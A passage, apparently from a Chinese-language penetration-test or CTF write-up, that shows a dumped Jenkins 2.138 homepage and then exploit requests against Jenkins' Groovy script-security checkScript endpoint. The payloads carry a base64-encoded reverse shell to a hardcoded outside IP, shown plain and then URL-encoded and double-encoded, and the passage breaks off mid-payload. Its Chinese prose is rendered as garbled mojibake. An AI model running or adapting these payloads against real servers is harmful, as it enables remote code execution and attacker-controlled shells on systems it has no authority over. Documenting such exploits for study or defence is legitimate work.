class="string">&quot;search&quot;</span> href=<span class="string">&quot;/opensearch.xml&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;application/opensearchdescription+xml&quot;</span> title=<span class="string">&quot;Jenkins&quot;</span> /&gt;&lt;meta name=<span class="string">&quot;ROBOTS&quot;</span> content=<span class="string">&quot;INDEX,NOFOLLOW&quot;</span> /&gt;&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;alternate&quot;</span> href=<span class="string">&quot;/rssAll&quot;</span> title=<span class="string">&quot;Jenkins:all (all builds)&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;application/rss+xml&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;alternate&quot;</span> href=<span class="string">&quot;/rssAll?flavor=rss20&quot;</span> title=<span class="string">&quot;Jenkins:all (all builds) (RSS 2.0)&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;application/rss+xml&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;alternate&quot;</span> href=<span class="string">&quot;/rssFailed&quot;</span> title=<span class="string">&quot;Jenkins:all (failed builds)&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;application/rss+xml&quot;</span> /&gt;&lt;link rel=<span class="string">&quot;alternate&quot;</span> href=<span class="string">&quot;/rssFailed?flavor=rss20&quot;</span> title=<span class="string">&quot;Jenkins:all (failed builds) (RSS 2.0)&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;application/rss+xml&quot;</span> /&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/scripts/yui/cookie/cookie-min.js&quot;</span>&gt;&lt;/script&gt;&lt;script&gt;</span><br><span class="line">              YAHOO.util.Cookie.<span class="built_in">set</span>(<span class="string">&quot;screenResolution&quot;</span>, screen.width+<span class="string">&quot;x&quot;</span>+screen.height);</span><br><span class="line">            &lt;/script&gt;&lt;script src=<span class="string">&quot;/static/e1c81722/jsbundles/page-init.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;&lt;/head&gt;&lt;body data-model-<span class="built_in">type</span>=<span class="string">&quot;hudson.model.AllView&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;jenkins&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;yui-skin-sam two-column jenkins-2.138&quot;</span> data-version=<span class="string">&quot;2.138&quot;</span>&gt;&lt;a href=<span class="string">&quot;#skip2content&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;skiplink&quot;</span>&gt;Skip to content&lt;/a&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;page-head&quot;</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;header&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;logo&quot;</span>&gt;&lt;a <span class="built_in">id</span>=<span class="string">&quot;jenkins-home-link&quot;</span> href=<span class="string">&quot;/&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/headshot.png&quot;</span> alt=<span class="string">&quot;[Jenkins]&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;jenkins-head-icon&quot;</span> /&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/title.png&quot;</span> alt=<span class="string">&quot;Jenkins&quot;</span> width=<span class="string">&quot;139&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;jenkins-name-icon&quot;</span> height=<span class="string">&quot;34&quot;</span> /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;login&quot;</span>&gt; &lt;a href=<span class="string">&quot;/login?from=%2F&quot;</span>&gt;&lt;b&gt;log <span class="keyword">in</span>&lt;/b&gt;&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;searchbox hidden-xs&quot;</span>&gt;&lt;form method=<span class="string">&quot;get&quot;</span> name=<span class="string">&quot;search&quot;</span> action=<span class="string">&quot;/search/&quot;</span> style=<span class="string">&quot;position:relative;&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;no-json&quot;</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;search-box-minWidth&quot;</span>&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;search-box-sizer&quot;</span>&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;searchform&quot;</span>&gt;&lt;<span class="built_in">input</span> name=<span class="string">&quot;q&quot;</span> placeholder=<span class="string">&quot;search&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;search-box&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;has-default-text&quot;</span> /&gt; &lt;a href=<span class="string">&quot;https://jenkins.io/redirect/search-box&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/16x16/help.png&quot;</span> style=<span class="string">&quot;width: 16px; height: 16px; &quot;</span> <span class="keyword">class</span>=<span class="string">&quot;icon-help icon-sm&quot;</span> /&gt;&lt;/a&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;search-box-completion&quot;</span>&gt;&lt;/div&gt;&lt;script&gt;createSearchBox(<span class="string">&quot;/search/&quot;</span>);&lt;/script&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;breadcrumbBar&quot;</span>&gt;&lt;tr <span class="built_in">id</span>=<span class="string">&quot;top-nav&quot;</span>&gt;&lt;td <span class="built_in">id</span>=<span class="string">&quot;left-top-nav&quot;</span> colspan=<span class="string">&quot;2&quot;</span>&gt;&lt;link rel=<span class="string">&#x27;stylesheet&#x27;</span> href=<span class="string">&#x27;/adjuncts/e1c81722/lib/layout/breadcrumbs.css&#x27;</span> <span class="built_in">type</span>=<span class="string">&#x27;text/css&#x27;</span> /&gt;&lt;script src=<span class="string">&#x27;/adjuncts/e1c81722/lib/layout/breadcrumbs.js&#x27;</span> <span class="built_in">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;&lt;/script&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;top-sticker noedge&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;top-sticker-inner&quot;</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;right-top-nav&quot;</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;right-top-nav&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;smallfont&quot;</span>&gt;&lt;a href=<span class="string">&quot;?auto_refresh=true&quot;</span>&gt;ENABLE AUTO REFRESH&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;ul <span class="built_in">id</span>=<span class="string">&quot;breadcrumbs&quot;</span>&gt;&lt;li <span class="keyword">class</span>=<span class="string">&quot;item&quot;</span>&gt;&lt;a href=<span class="string">&quot;/&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;model-link inside&quot;</span>&gt;Jenkins&lt;/a&gt;&lt;/li&gt;&lt;li href=<span class="string">&quot;/&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;children&quot;</span>&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;breadcrumb-menu-target&quot;</span>&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;page-body&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;clear&quot;</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;side-panel&quot;</span>&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;tasks&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;task&quot;</span>&gt;&lt;a href=<span class="string">&quot;/asynchPeople/&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;task-icon-link&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/24x24/user.png&quot;</span> style=<span class="string">&quot;width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;icon-user icon-md&quot;</span> /&gt;&lt;/a&gt; &lt;a href=<span class="string">&quot;/asynchPeople/&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;task-link&quot;</span>&gt;People&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;task&quot;</span>&gt;&lt;a href=<span class="string">&quot;/view/all/builds&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;task-icon-link&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/24x24/notepad.png&quot;</span> style=<span class="string">&quot;width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;icon-notepad icon-md&quot;</span> /&gt;&lt;/a&gt; &lt;a href=<span class="string">&quot;/view/all/builds&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;task-link&quot;</span>&gt;Build History&lt;/a&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;task&quot;</span>&gt;&lt;a href=<span class="string">&quot;/credentials&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;task-icon-link&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/plugin/credentials/images/24x24/credentials.png&quot;</span> style=<span class="string">&quot;width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;icon-credentials-credentials icon-md&quot;</span> /&gt;&lt;/a&gt; &lt;a href=<span class="string">&quot;/credentials&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;task-link&quot;</span>&gt;Credentials&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;buildQueue&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;container-fluid pane-frame track-mouse expanded&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;row&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;col-xs-24 pane-header&quot;</span>&gt;&lt;a href=<span class="string">&quot;/toggleCollapse?paneId=buildQueue&quot;</span> title=<span class="string">&quot;collapse&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;collapse&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/16x16/collapse.png&quot;</span> alt=<span class="string">&quot;collapse&quot;</span> style=<span class="string">&quot;width: 16px; height: 16px; &quot;</span> <span class="keyword">class</span>=<span class="string">&quot;icon-collapse icon-sm&quot;</span> /&gt;&lt;/a&gt;Build Queue&lt;/div&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;row pane-content&quot;</span>&gt;&lt;table <span class="keyword">class</span>=<span class="string">&quot;pane &quot;</span>&gt;&lt;script src=<span class="string">&#x27;/adjuncts/e1c81722/lib/form/link/link.js&#x27;</span> <span class="built_in">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;&lt;/script&gt;&lt;tr&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span> colspan=<span class="string">&quot;2&quot;</span>&gt;No builds <span class="keyword">in</span> the queue.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script defer=<span class="string">&quot;defer&quot;</span>&gt;refreshPart(<span class="string">&#x27;buildQueue&#x27;</span>,<span class="string">&quot;/ajaxBuildQueue&quot;</span>);&lt;/script&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;executors&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;container-fluid pane-frame track-mouse expanded&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;row&quot;</span>&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;col-xs-24 pane-header&quot;</span>&gt;&lt;a href=<span class="string">&quot;/toggleCollapse?paneId=executors&quot;</span> title=<span class="string">&quot;collapse&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;collapse&quot;</span>&gt;&lt;img src=<span class="string">&quot;/static/e1c81722/images/16x16/collapse.png&quot;</span> alt=<span class="string">&quot;collapse&quot;</span> style=<span class="string">&quot;width: 16px; height: 16px; &quot;</span> <span class="keyword">class</span>=<span class="string">&quot;icon-collapse icon-sm&quot;</span> /&gt;&lt;/a&gt;&lt;a href=<span class="string">&#x27;/computer/&#x27;</span>&gt;Build Executor Status&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div <span class="keyword">class</span>=<span class="string">&quot;row pane-content&quot;</span>&gt;&lt;table <span class="keyword">class</span>=<span class="string">&quot;pane &quot;</span>&gt;&lt;colgroup&gt;&lt;col width=<span class="string">&quot;30&quot;</span> /&gt;&lt;col width=<span class="string">&quot;200*&quot;</span> /&gt;&lt;col width=<span class="string">&quot;24&quot;</span> /&gt;&lt;/colgroup&gt;&lt;tr&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span> align=<span class="string">&quot;right&quot;</span> style=<span class="string">&quot;vertical-align: top&quot;</span>&gt;<span class="number">1</span>&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span>&gt;Idle&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span>&gt;&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span>&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span> align=<span class="string">&quot;right&quot;</span> style=<span class="string">&quot;vertical-align: top&quot;</span>&gt;<span class="number">2</span>&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span>&gt;Idle&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span>&gt;&lt;/td&gt;&lt;td <span class="keyword">class</span>=<span class="string">&quot;pane&quot;</span>&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script defer=<span class="string">&quot;defer&quot;</span>&gt;refreshPart(<span class="string">&#x27;executors&#x27;</span>,<span class="string">&quot;/ajaxExecutors&quot;</span>);&lt;/script&gt;&lt;/div&gt;&lt;div <span class="built_in">id</span>=<span class="string">&quot;main-panel&quot;</span>&gt;&lt;a name=<span class="string">&quot;skip</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°jenkinsç‰ˆæœ¬ä¸º2.138,åˆ«é—®ğŸ‘´æ€ä¹ˆçœ‹åˆ°çš„,ä½ å’‹é‚£ä¹ˆå¤šäº‹å‘¢ğŸ˜¡</p><p><a href="https://www.cnblogs.com/cute-puli/p/15378440.html">https://www.cnblogs.com/cute-puli/p/15378440.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:<span class="number">8080</span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%<span class="number">20</span><span class="keyword">class</span>%20x%<span class="number">20</span>&#123;public%20x()&#123;%<span class="number">22</span>å‘½ä»¤æ›¿æ¢%<span class="number">22.</span>execute()&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‰“è¿™ä¸ªå‘½ä»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jenkins:<span class="number">8080</span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public <span class="keyword">class</span> <span class="title class_">x</span> &#123;public x()&#123;<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTkyLjE5LzExNDUgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>.execute()&#125;&#125;</span><br></pre></td></tr></table></figure><p>å…ˆæŠŠvalueçš„å€¼urlç¼–ç ,ç„¶åæŠŠæ•´ä¸ªé‡å®šå‘ç½‘å€urlç¼–ç ,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jenkins:<span class="number">8080</span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=%<span class="number">70</span>%<span class="number">75</span>%<span class="number">62</span>%6c%<span class="number">69</span>%<span class="number">63</span>%<span class="number">20</span>%<span class="number">63</span>%6c%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">20</span>%<span class="number">78</span>%<span class="number">20</span>%7b%0a%<span class="number">20</span>%<span class="number">20</span>%<span class="number">70</span>%<span class="number">75</span>%<span class="number">62</span>%6c%<span class="number">69</span>%<span class="number">63</span>%<span class="number">20</span>%<span class="number">78</span>%<span class="number">28</span>%<span class="number">29</span>%7b%0a%<span class="number">20</span>%<span class="number">20</span>%<span class="number">20</span>%<span class="number">20</span>%<span class="number">22</span>%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">68</span>%<span class="number">20</span>%2d%<span class="number">63</span>%<span class="number">20</span>%7b%<span class="number">65</span>%<span class="number">63</span>%<span class="number">68</span>%6f%2c%<span class="number">59</span>%6d%<span class="number">46</span>%7a%<span class="number">61</span>%<span class="number">43</span>%<span class="number">41</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">53</span>%<span class="number">41</span>%2b%4a%<span class="number">69</span>%<span class="number">41</span>%<span class="number">76</span>%5a%<span class="number">47</span>%<span class="number">56</span>%<span class="number">32</span>%4c%<span class="number">33</span>%<span class="number">52</span>%6a%<span class="number">63</span>%<span class="number">43</span>%<span class="number">38</span>%<span class="number">30</span>%4d%<span class="number">79</span>%<span class="number">34</span>%<span class="number">78</span>%4e%<span class="number">44</span>%4d%<span class="number">75</span>%4d%<span class="number">54</span>%6b%<span class="number">79</span>%4c%6a%<span class="number">45</span>%<span class="number">35</span>%4c%7a%<span class="number">45</span>%<span class="number">78</span>%4e%<span class="number">44</span>%<span class="number">55</span>%<span class="number">67</span>%4d%<span class="number">44</span>%<span class="number">34</span>%6d%4d%<span class="number">51</span>%3d%3d%7d%7c%7b%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">36</span>%<span class="number">34</span>%2c%2d%<span class="number">64</span>%7d%7c%7b%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">68</span>%2c%2d%<span class="number">69</span>%7d%<span class="number">22</span>%2e%<span class="number">65</span>%<span class="number">78</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">28</span>%<span class="number">29</span>%0a%<span class="number">20</span>%<span class="number">20</span>%7d%0a%7d</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">68</span>%<span class="number">74</span>%<span class="number">74</span>%<span class="number">70</span>%3a%2f%2f%6a%<span class="number">65</span>%6e%6b%<span class="number">69</span>%6e%<span class="number">73</span>%3a%<span class="number">38</span>%<span class="number">30</span>%<span class="number">38</span>%<span class="number">30</span>%2f%<span class="number">73</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">79</span>%<span class="number">52</span>%<span class="number">65</span>%<span class="number">61</span>%6c%6d%2f%<span class="number">75</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">72</span>%2f%<span class="number">61</span>%<span class="number">64</span>%6d%<span class="number">69</span>%6e%2f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%6f%<span class="number">72</span>%<span class="number">42</span>%<span class="number">79</span>%4e%<span class="number">61</span>%6d%<span class="number">65</span>%2f%6f%<span class="number">72</span>%<span class="number">67</span>%2e%6a%<span class="number">65</span>%6e%6b%<span class="number">69</span>%6e%<span class="number">73</span>%<span class="number">63</span>%<span class="number">69</span>%2e%<span class="number">70</span>%6c%<span class="number">75</span>%<span class="number">67</span>%<span class="number">69</span>%6e%<span class="number">73</span>%2e%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">74</span>%<span class="number">79</span>%2e%<span class="number">73</span>%<span class="number">61</span>%6e%<span class="number">64</span>%<span class="number">62</span>%6f%<span class="number">78</span>%2e%<span class="number">67</span>%<span class="number">72</span>%6f%6f%<span class="number">76</span>%<span class="number">79</span>%2e%<span class="number">53</span>%<span class="number">65</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">47</span>%<span class="number">72</span>%6f%6f%<span class="number">76</span>%<span class="number">79</span>%<span class="number">53</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%2f%<span class="number">63</span>%<span class="number">68</span>%<span class="number">65</span>%<span class="number">63</span>%6b%<span class="number">53</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%3f%<span class="number">73</span>%<span class="number">61</span>%6e%<span class="number">64</span>%<span class="number">62</span>%6f%<span class="number">78</span>%3d%<span class="number">74</span>%<span class="number">72</span>%<span class="number">75</span>%<span class="number">65</span>%<span class="number">26</span>%<span class="number">76</span>%<span class="number">61</span>%6c%<span class="number">75</span>%<span class="number">65</span>%3d%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">62</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span 